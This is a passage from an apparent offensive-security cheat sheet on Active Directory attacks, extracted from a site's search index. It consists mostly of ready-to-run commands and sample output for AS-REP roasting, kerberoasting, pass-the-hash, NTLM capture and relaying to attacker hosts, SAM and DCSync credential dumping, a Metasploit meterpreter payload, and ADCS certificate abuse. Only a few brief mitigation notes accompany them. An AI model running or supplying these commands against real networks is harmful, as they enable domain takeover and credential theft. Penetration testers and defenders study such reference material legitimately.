192.168.52.100:88\n[*] Sent 169 bytes\n[*] Received 1437 bytes\n[+] AS-REQ w/o preauth successful!\n[*] AS-REP hash:\n$krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...\n</code></pre> * GetNPUsers from Impacket Suite <pre><code>$ python GetNPUsers.py htb.local/svc-alfresco -no-pass\n[*] Getting TGT for svc-alfresco\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4\n# extract hashes\nroot@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\nroot@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast\n</code></pre> * CrackMapExec Module <pre><code>$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt\nLDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5\n</code></pre> Using <code>hashcat</code> or <code>john</code> to crack the ticket. <pre><code># crack AS_REP messages with hashcat\nroot@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt \nroot@windows:hashcat$ hashcat64.exe -m 18200 '&lt;AS_REP-hash&gt;' -a 0 c:\\wordlists\\rockyou.txt\n# crack AS_REP messages with john\nC:\\Rubeus&gt; john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast\n</code></pre> Mitigations: * All accounts must have \"Kerberos Pre-Authentication\" enabled (Enabled by Default). ## Kerberoasting w/o domain account &gt; In September 2022 a vulnerability was discovered by Charlie Clark, ST (Service Tickets) can be obtained through KRB_AS_REQ request without having to control any Active Directory account. If a principal can authenticate without pre-authentication (like AS-REP Roasting attack), it is possible to use it to launch an KRB_AS_REQ request and trick the request to ask for a ST instead of a encrypted TGT, by modifying the sname attribute in the req-body part of the request. The technique is fully explained in this article: Semperis blog post.  You must provide a list of users because we don't have a valid account to query the LDAP using this technique. <ul> <li>impacket/GetUserSPNs.py from PR #1413 <pre><code>GetUserSPNs.py -no-preauth \"NO_PREAUTH_USER\" -usersfile \"LIST_USERS\" -dc-host \"dc.domain.local\" \"domain.local\"/\n</code></pre></li> <li>GhostPack/Rubeus from PR #139 <pre><code>Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:\"domain.local\" /dc:\"dc.domain.local\" /nopreauth:\"NO_PREAUTH_USER\" /spn:\"TARGET_SERVICE\"\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#cve-2022-33679","title":"CVE-2022-33679","text":"<p>CVE-2022-33679 performs an encryption downgrade attack by forcing the KDC to use the RC4-MD4 algorithm and then brute forcing the session key from the AS-REP using a known plaintext attack, Similar to AS-REP Roasting, it works against accounts that have pre-authentication disabled and the attack is unauthenticated meaning we don\u2019t need a client\u2019s password..</p> <p>Research from Project Zero : https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html</p> <p>Requirements: - Accounts with the attribute DONT_REQ_PREAUTH (<code>PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</code>)</p> <ul> <li>using CVE-2022-33679.py <pre><code>user@hostname:~$ python CVE-2022-33679.py DOMAIN.LOCAL/User DC01.DOMAIN.LOCAL\nuser@hostname:~$ export KRB5CCNAME=/home/project/User.ccache\nuser@hostname:~$ crackmapexec smb DC01.DOMAIN.LOCAL -k --shares\n</code></pre></li> </ul> <p>Mitigations:  * All accounts must have \"Kerberos Pre-Authentication\" enabled (Enabled by Default). * Disable RC4 cipher if possible.</p>"},{"location":"active-directory/active-directory-attacks/#timeroasting","title":"Timeroasting","text":"<p>Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID</p> <ul> <li>SecuraBV/Timeroast - Timeroasting scripts by Tom Tervoort     <pre><code>sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt\nhashcat -m 31300 ntp-hashes.txt\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#pass-the-hash","title":"Pass-the-Hash","text":"<p>The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren\u2019t the built-in RID 500.</p> <ul> <li>Metasploit   <pre><code>use exploit/windows/smb/psexec\nset RHOST 10.2.0.3\nset SMBUser jarrieta\nset SMBPass nastyCutt3r  \n# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.\n# NOTE2: Require the full NT hash, you may need to add the \"blank\" LM (aad3b435b51404eeaad3b435b51404ee)\nset PAYLOAD windows/meterpreter/bind_tcp\nrun\nshell\n</code></pre></li> <li>CrackMapExec   <pre><code>cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x \"whoami\"\n</code></pre></li> <li>Impacket suite   <pre><code>proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d\n</code></pre></li> <li>Windows RDP and mimikatz   <pre><code>sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863\nsekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the users ntlm hash&gt; /run:\"mstsc.exe /restrictedadmin\"\n</code></pre></li> </ul> <p>You can extract the local SAM database to find the local administrator hash :</p> <pre><code>C:\\&gt; reg.exe save hklm\\sam c:\\temp\\sam.save\nC:\\&gt; reg.exe save hklm\\security c:\\temp\\security.save\nC:\\&gt; reg.exe save hklm\\system c:\\temp\\system.save\n$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#overpass-the-hash-pass-the-key","title":"OverPass-the-Hash (pass the key)","text":"<p>In this technique, instead of passing the hash directly, we use the NT hash of an account to request a valid Kerberost ticket (TGT).</p>"},{"location":"active-directory/active-directory-attacks/#using-impacket","title":"Using impacket","text":"<pre><code>root@kali:~$ python ./getTGT.py -hashes \":1a59bd44fe5bec39c44c8cd3524dee\" lab.ropnop.com\nroot@kali:~$ export KRB5CCNAME=\"/root/impacket-examples/velociraptor.ccache\"\nroot@kali:~$ python3 psexec.py \"jurassic.park/velociraptor@labwws02.jurassic.park\" -k -no-pass\n# also with the AES Key if you have it\nroot@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com\nroot@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5\nroot@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM\nroot@kali:~$ klist\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#using-rubeus","title":"Using Rubeus","text":"<pre><code># Request a TGT as the target user and pass it into the current session\n# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs\n.\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt\n# More stealthy variant, but requires the AES256 hash\n.\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt\n# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)\n.\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#capturing-and-cracking-net-ntlmv1ntlmv1-hashestokens","title":"Capturing and cracking Net-NTLMv1/NTLMv1 hashes/tokens","text":"<p>Net-NTLMv1 (NTLMv1) authentication tokens are used for network authentication (they are derived from a challenge/response DES-based algorithm with the user's NT-hash as symetric keys.   : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication. This uses the outdated encryption method DES to protect the NT/LM Hashes. Requirements: * LmCompatibilityLevel = 0x1: Send LM &amp; NTLM (<code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel</code>) Exploitation: * Capturing using Responder: Edit the <code>/etc/responder/Responder.conf</code> file to include the magical 1122334455667788 challenge     <pre><code>HTTPS = On\nDNS = On\nLDAP = On\n...\n; Custom challenge.\n; Use \"Random\" for generating a random challenge for each requests (Default)\nChallenge = 1122334455667788\n</code></pre> * Fire Responder: <code>responder -I eth0 --lm</code>, if <code>--disable-ess</code> is set, extended session security will be disabled for NTLMv1 authentication * Force a callback:     <pre><code>PetitPotam.exe Responder-IP DC-IP # Patched around August 2021\nPetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users\n</code></pre> * If you got some <code>NetNTLMv1 tokens</code>, you can try to shuck them online via Shuck.Sh or locally/on-premise via ShuckNT to get NT-hashes corresponding from HIBP database. If the NT-hash has previously leaked, the NetNTLMv1 is converted to NT-hash (pass-the-hash ready) instantly. The shucking process works for any NetNTLMv1 with or without ESS/SSP (challenge != <code>1122334455667788</code>) but mainly for user account (plaintext previsouly leaked).     <pre><code># Submit NetNTLMv1 online to https://shuck.sh/get-shucking.php\n# Or shuck them on-premise via ShuckNT script:\n$ php shucknt.php -f tokens-samples.txt -w pwned-passwords-ntlm-reversed-ordered-by-hash-v8.bin\n[...]\n10 hashes-challenges analyzed in 3 seconds, with 8 NT-Hash instantly broken for pass-the-hash and 1 that can be broken via crack.sh for free.\n[INPUT] ycam::ad:DEADC0DEDEADC0DE00000000000000000000000000000000:70C249F75FB6D2C0AC2C2D3808386CCAB1514A2095C582ED:1122334455667788\n        [NTHASH-SHUCKED] 93B3C62269D55DB9CA660BBB91E2BD0B\n</code></pre> * If you got some <code>NetNTLMv1 tokens</code>, you can also try to crack them via Crack.Sh (cloud service when available, more time and potentially chargeable). For this you need to format them to submit them on Crack.Sh. The Converter of Shuck.Sh can be used to convert format easily.     <pre><code># When there is no-ESS/SSP and the challenge is set to 1122334455667788, it's free (0$):\nusername::hostname:response:response:challenge -&gt; NTHASH:response\nNTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972\n\n# When there is ESS/SSP or challenge != 1122334455667788, it's chargeable from $20-$200:\nusername::hostname:lmresponse+0padding:ntresponse:challenge -&gt; $NETNTLM$challenge$ntresponse\n$NETNTLM$DEADC0DEDEADC0DE$507E2A2131F4AF4A299D8845DE296F122CA076D49A80476E\n</code></pre> * Finaly, if no Shuck.Sh nor Crack.Sh can be used, you can try to break NetNTLMv1 with Hashcat / John The Ripper     <pre><code>john --format=netntlm hash.txt\nhashcat -m 5500 -a 3 hash.txt # for NetNTLMv1(-ESS/SSP) to plaintext (for user account)\nhashcat -m 27000 -a 0 hash.txt nthash-wordlist.txt # for NetNTLMv1(-ESS/SSP) to NT-hash (for user and computer account, depending on nthash-wordlist quality)\nhashcat -m 14000 -a 3 inputs.txt --hex-charset -1 /usr/share/hashcat/charsets/DES_full.hcchr ?1?1?1?1?1?1?1?1 # for NetNTLMv1(-ESS/SSP) to DES-keys (KPA-attack) of user/computer account with 100% success rate, then regenerate NT-hash with these DES-keys on https://shuck.sh/converter.php.\n</code></pre> * Now you can DCSync using the Pass-The-Hash with the DC machine account  NetNTLMv1 with ESS / SSP (Extended Session Security / Security Support Provider) changes the final challenge by adding a new alea (!= <code>1122334455667788</code>, so chargeable on Crack.Sh).  NetNTLMv1 format is <code>login::domain:lmresp:ntresp:clientChall</code>. If the <code>lmresp</code> contains a 0's-padding this means that the token is protected by ESS/SSP.  NetNTLMv1 final challenge is the Responder's challenge itself (<code>1122334455667788</code>) when there is no ESS/SSP. If ESS/SSP is enabled, the final challenge is the first 8 bytes of the MD5 hash from the concatenation of the client challenge and server challenge. The details of the algorithmic generation of a NetNTLMv1 are illustrated on the Shuck.Sh Generator and detailed in MISCMag#128.  If you get some tokens from other tools (hostapd-wpe or chapcrack) in other formats, like tokens starting with the prefix <code>$MSCHAPv2$</code>, <code>$NETNTLM$</code> or <code>$99$</code>, they correspond to a classic NetNTLMv1 and can be converted from one format to another here. Mitigations:  * Set the Lan Manager authentication level to <code>Send NTLMv2 responses only. Refuse LM &amp; NTLM</code></p>"},{"location":"active-directory/active-directory-attacks/#capturing-and-cracking-net-ntlmv2ntlmv2-hashes","title":"Capturing and cracking Net-NTLMv2/NTLMv2 hashes","text":"<p>If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network. <pre><code># https://github.com/lgandx/Responder\n$ sudo ./Responder.py -I eth0 -wfrd -P -v\n# https://github.com/Kevin-Robertson/InveighZero\nPS &gt; .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]\n# https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1\nPS &gt; Invoke-Inveigh [-IP '10.10.10.10'] -ConsoleOutput Y -FileOutput Y -NBNS Y \u2013mDNS Y \u2013Proxy Y -MachineAccounts Y\n</code></pre> Crack the hashes with Hashcat / John The Ripper <pre><code>john --format=netntlmv2 hash.txt\nhashcat -m 5600 -a 3 hash.txt\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#man-in-the-middle-attacks-relaying","title":"Man-in-the-Middle attacks &amp; relaying","text":"<p>NTLMv1 and NTLMv2 can be relayed to connect to another machine. | Hash                 | Hashcat | Attack method       | |---|---|---| | LM                    | <code>3000</code>  | crack/pass the hash  | | NTLM/NTHash           | <code>1000</code>  | crack/pass the hash  | | NTLMv1/Net-NTLMv1     | <code>5500</code>  | crack/relay attack   | | NTLMv2/Net-NTLMv2     | <code>5600</code>  | crack/relay attack   | Crack the hash with <code>hashcat</code>. <pre><code>hashcat -m 5600 -a 0 hash.txt crackstation.txt\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#ms08-068-ntlm-reflection","title":"MS08-068 NTLM reflection","text":"<p>NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.</p> <p>This vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim\u2019s own credentials. * https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068 <pre><code>msf &gt; use exploit/windows/smb/smb_relay\nmsf exploit(smb_relay) &gt; show targets\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#ldap-signing-not-required-and-ldap-channel-binding-disabled","title":"LDAP signing not required and LDAP channel binding disabled","text":"<p>During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed: * LDAP signing not required (by default set to <code>Not required</code>) * LDAP channel binding is disabled. (by default disabled) * <code>ms-DS-MachineAccountQuota</code> needs to be at least at 1 for the account relayed (10 by default) Then we can use a tool to poison <code>LLMNR</code>, <code>MDNS</code> and <code>NETBIOS</code> requests on the network such as <code>Responder</code> and use <code>ntlmrelayx</code> to add our computer. <pre><code># On first terminal\nsudo ./Responder.py -I eth0 -wfrd -P -v\n# On second terminal\nsudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer\n</code></pre> It is required here to relay to LDAP over TLS because creating accounts is not allowed over an unencrypted connection.</p>"},{"location":"active-directory/active-directory-attacks/#smb-signing-disabled-and-ipv4","title":"SMB Signing Disabled and IPv4","text":"<p>If a machine has <code>SMB signing</code>:<code>disabled</code>, it is possible to use Responder with Multirelay.py script to perform an <code>NTLMv2 hashes relay</code> and get a shell access on the machine. Also called LLMNR/NBNS Poisoning 1. Open the Responder.conf file and set the value of <code>SMB</code> and <code>HTTP</code> to <code>Off</code>.     <pre><code>[Responder Core]\n; Servers to start\n...\nSMB = Off     # Turn this off\nHTTP = Off    # Turn this off\n</code></pre> 2. Run <code>python  RunFinger.py -i IP_Range</code> to detect machine with <code>SMB signing</code>:<code>disabled</code>. 3. Run <code>python Responder.py -I &lt;interface_card&gt;</code>  4. Use a relay tool such as <code>ntlmrelayx</code> or <code>MultiRelay</code>     - <code>impacket-ntlmrelayx -tf targets.txt</code> to dump the SAM database of the targets in the list.      - <code>python MultiRelay.py -t &lt;target_machine_IP&gt; -u ALL</code> 5. ntlmrelayx can also act as a SOCK proxy with every compromised sessions.     <pre><code>$ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support\n[*] Servers started, waiting for connections\nType help for list of commands\nntlmrelayx&gt; socks\nProtocol  Target          Username                  Port\n--------  --------------  ------------------------  ----\nMSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433\nSMB       192.168.48.230  CONTOSO/NORMALUSER1       445\nMSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433\n# You might need to select a target with \"-t\"\n# smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// and smtp://\nimpacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support\nimpacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support\n# the socks proxy can then be used with your Impacket tools or CrackMapExec\n$ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1\n$ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth\n$ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q \"SELECT 1\"   \n</code></pre> Mitigations:  * Disable LLMNR via group policy     <pre><code>Open gpedit.msc and navigate to Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client &gt; Turn off multicast name resolution and set to Enabled\n</code></pre>  * Disable NBT-NS     <pre><code>This can be achieved by navigating through the GUI to Network card &gt; Properties &gt; IPv4 &gt; Advanced &gt; WINS and then under \"NetBIOS setting\" select Disable NetBIOS over TCP/IP\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#smb-signing-disabled-and-ipv6","title":"SMB Signing Disabled and IPv6","text":"<p>Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS. <pre><code>crackmapexec smb $hosts --gen-relay-list relay.txt\n# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6\n# -d is the domain name that we filter our request on - the attacked domain\n# -i is the interface we have mitm6 listen on for events\nmitm6 -i eth0 -d $domain\n# spoofing WPAD and relaying NTLM credentials\nimpacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt\nimpacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug\n# -ip is the interface you want the relay to run on\n# -wh is for WPAD host, specifying your wpad file to serve\n# -t is the target where you want to relay to. \nimpacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#drop-the-mic","title":"Drop the MIC","text":"<p>The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP Check vulnerability with cve-2019-1040-scanner <pre><code>python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'\n[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth\n[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)\n</code></pre> - Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD     <pre><code>TERM1&gt; python printerbug.py testsegment.local/username@s2012exc.testsegment.local &lt;attacker ip/hostname&gt;\nTERM2&gt; ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support\nTERM1&gt; secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc\n</code></pre> - Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.     <pre><code># create a new machine account\nTERM1&gt; ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support \nTERM2&gt; python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6\nTERM1&gt; getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME\n# connect using the ticket\nexport KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache\nsecretsdump.py -k -no-pass second-dc-server.local -just-dc\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#ghost-potato-cve-2019-1384","title":"Ghost Potato - CVE-2019-1384","text":"<p>Requirements: * User must be a member of the local Administrators group * User must be a member of the Backup Operators group * Token must be elevated Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip <pre><code>ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#remotepotato0-dcom-dce-rpc-relay","title":"RemotePotato0 DCOM DCE RPC relay","text":"<p>It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine Requirements: - a shell in session 0 (e.g. WinRm shell or SSH shell) - a privileged user is logged on in the session 1 (e.g. a Domain Admin user) <pre><code># https://github.com/antonioCoco/RemotePotato0/\nTerminal&gt; sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &amp; # Can be omitted for Windows Server &lt;= 2016\nTerminal&gt; sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1\nSession0&gt; RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2\nTerminal&gt; psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#dns-poisonning-relay-delegation-with-mitm6","title":"DNS Poisonning - Relay delegation with mitm6","text":"<p>Requirements:  - IPv6 enabled (Windows prefers IPV6 over IPv4) - LDAP over TLS (LDAPS)</p> <p>ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it. <pre><code>git clone https://github.com/fox-it/mitm6.git \ncd /opt/tools/mitm6\npip install .\nmitm6 -hw ws02 -d lab.local --ignore-nofqnd\n# -d: the domain name that we filter our request on (the attacked domain)\n# -i: the interface we have mitm6 listen on for events\n# -hw: host whitelist\nntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad\nntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer\n# -ip: the interface you want the relay to run on\n# -wh: WPAD host, specifying your wpad file to serve\n# -t: the target where you want to relay to\n# now granting delegation rights and then do a RBCD\nntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad\ngetST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate Administrator  \nexport KRB5CCNAME=administrator.ccache  \nsecretsdump.py -k -no-pass target.lab.local  \n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#relaying-with-webdav-trick","title":"Relaying with WebDav Trick","text":"<p>Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB Requirement: *  WebClient service Exploitation: * Disable HTTP in Responder: <code>sudo vi /usr/share/responder/Responder.conf</code> * Generate a Windows machine name: <code>sudo responder -I eth0</code>, e.g: WIN-UBNW4FI3AP0 * Prepare for RBCD against the DC: <code>python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support</code> * Discover WebDAV services     <pre><code>webclientservicescanner 'domain.local'/'user':'password'@'machine'\ncrackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav\nGetWebDAVStatus.exe 'machine'\n</code></pre> * Trigger the authentication to relay to our nltmrelayx: <code>PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4</code>, the listener host must be specified with the FQDN or full netbios name like <code>logger.domain.local@80/test.txt</code>. Specifying the IP results in anonymous auth instead of System.    <pre><code># PrinterBug\ndementor.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nSpoolSample.exe \"ATTACKER_IP\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\"\n# PetitPotam\nPetitpotam.py \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nPetitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\nPetitPotam.exe \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\"\n</code></pre> * Use the created account to ask for a service ticket:      <pre><code>.\\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l&lt;i$;UzD7W'\n.\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt\nls \\\\PC1.purple.lab\\c$\n# IP of PC1: 10.0.0.4\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#man-in-the-middle-rdp-connections-with-pyrdp-mitm","title":"Man-in-the-middle RDP connections with pyrdp-mitm","text":"<ul> <li>https://github.com/GoSecure/pyrdp</li> <li>https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/</li> <li>Usage <pre><code>pyrdp-mitm.py &lt;IP&gt;\npyrdp-mitp.py &lt;IP&gt;:&lt;PORT&gt; # with custom port\npyrdp-mitm.py &lt;IP&gt; -k private_key.pem -c certificate.pem # with custom key and certificate\n</code></pre></li> <li>Exploitation</li> <li>If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge</li> <li>If NLA is disabled, you will obtain the password in plaintext</li> <li>Other features are available such as keystroke recording</li> <li>Alternatives</li> <li>S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener  </li> </ul>"},{"location":"active-directory/active-directory-attacks/#active-directory-certificate-services","title":"Active Directory Certificate Services","text":"<ul> <li>Find ADCS Server</li> <li><code>crackmapexec ldap domain.lab -u username -p password -M adcs</code></li> <li><code>ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=&lt;user&gt;,OU=Users,DC=domain,DC=local' -w '&lt;password&gt;' -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\" dNSHostName</code></li> <li>Enumerate AD Enterprise CAs with certutil: <code>certutil.exe -config - -ping</code>, <code>certutil -dump</code></li> </ul>"},{"location":"active-directory/active-directory-attacks/#esc1-misconfigured-certificate-templates","title":"ESC1 - Misconfigured Certificate Templates","text":"<p>Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject. Requirements * Template that allows for AD authentication * ENROLLEE_SUPPLIES_SUBJECT flag * [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)  Exploitation * Use Certify.exe to see if there are any vulnerable templates     <pre><code>Certify.exe find /vulnerable\nCertify.exe find /vulnerable /currentuser\n# or\nPS&gt; Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'\n# or\ncertipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound\n</code></pre> * Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate)     <pre><code># request certificates for the machine account by executing Certify with the \"/machine\" argument from an elevated command prompt.\nCertify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin\ncerti.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN\ncertipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'\n</code></pre> * Use OpenSSL and convert the certificate, do not enter a password     <pre><code>openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n</code></pre> * Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus     <pre><code>Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx\n</code></pre> WARNING: These certificates will still be usable even if the user or computer resets their password! NOTE: Look for EDITF_ATTRIBUTESUBJECTALTNAME2, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, ManageCA flags, and NTLM Relay to AD CS HTTP 